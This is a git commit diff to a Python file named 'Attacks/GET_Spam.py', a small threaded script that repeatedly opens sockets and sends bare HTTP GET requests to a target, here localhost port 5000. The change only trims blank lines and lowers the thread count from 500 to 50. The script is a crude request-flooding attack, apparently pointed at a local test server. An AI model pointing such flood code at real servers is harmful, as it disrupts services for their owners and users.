a79cb4c04ff0cf9f659b70ff746b89ecf61b0052
WahajK <wahajkhan788@gmail.com>
2023-05-16 21:14:36 +0500

    IDK (2)

--- Attacks/GET_Spam.py
+++ Attacks/GET_Spam.py
@@ -6,16 +6,14 @@ def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
-        
         global attack_num
         attack_num += 1
         print(attack_num)
         
-        
 target = '127.0.0.1'
 port = 5000
 try:
-  for _ in range(500):
+  for _ in range(50):
     thread = threading.Thread(target=attack)
     thread.start()
 except (KeyboardInterrupt, SystemExit):
